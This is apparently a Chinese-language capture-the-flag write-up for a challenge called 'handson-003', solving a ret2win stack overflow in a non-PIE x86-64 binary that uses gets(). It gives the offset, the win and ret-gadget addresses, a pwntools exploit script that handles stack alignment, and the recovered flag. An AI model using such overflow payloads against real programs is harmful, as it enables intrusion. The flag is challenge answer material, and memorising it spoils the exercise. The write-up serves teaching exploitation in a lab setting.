# handson-003

## 题目简述

附件是非 PIE 的 x86-64 ELF，NX 开启但没有 stack canary。`main` 在栈上分配 8 字节缓冲区，却使用无长度限制的 `gets`；程序另有调用 `system("cat flag.txt")` 的 `win` 函数，目标是通过栈溢出完成 ret2win。

## 解题过程

反汇编显示缓冲区位于 `rbp-0x8`。从缓冲区起始到保存 RIP 的距离是 8 字节缓冲区加 8 字节保存 RBP，共 16 字节。已知：

```text
win = 0x4011dd
ret = 0x401238
```

在跳入 `win` 前额外经过一个 `ret`，使进入 `system` 前的栈满足 x86-64 ABI 的 16 字节对齐要求：

```python
from pwn import ELF, context, p64, process

exe = context.binary = ELF("./chall", checksec=False)
io = process(exe.path)

payload = b"A" * 8
payload += p64(0)          # saved RBP
payload += p64(0x401238)   # ret，修正栈对齐
payload += p64(exe.sym["win"])

io.sendlineafter(b"Enter input: ", payload)
print(io.recvall().decode())
```

服务端 `win` 读取真实 `flag.txt`，结果为：

```text
flag{mum_i_pwned_something!!!}
```

## 方法总结

ret2win 的最小检查项是缓冲区到 RIP 的偏移、PIE、canary 和目标函数地址。即使控制流已经跳到 `win`，调用 libc 时仍可能因 `movaps` 对齐崩溃；在 ROP 链前插入单独的 `ret` 是常见修复方式。
